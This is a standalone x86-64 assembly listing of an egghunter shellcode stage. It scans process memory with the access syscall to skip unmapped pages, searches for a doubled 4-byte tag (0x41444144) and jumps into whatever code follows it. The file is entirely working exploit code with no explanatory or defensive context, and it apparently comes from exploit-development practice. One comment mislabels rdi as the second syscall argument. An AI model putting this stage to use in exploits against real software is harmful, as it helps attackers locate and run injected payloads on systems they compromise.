global _start

section .text

_start:
	xor rsi, rsi
	mov rdi, rsi ; mov value 0 to rdi to use as second argument for syscall
nextpage:
	or di, 0xfff
	inc rdi

next_4bytes:
	xor rax,rax
	mov al, 21
	syscall

check:
	cmp al, 0xf2 ;compare lower 8 bits of rax register with EFAULT lowerbyte
	jz nextpage
	mov eax, 0x41444144 ;4 bytes TAG_EGG
	mov rdx, rdi
	scasd
	jnz next_4bytes
	scasd
	jnz next_4bytes
	jmp rdi ;egg found!!
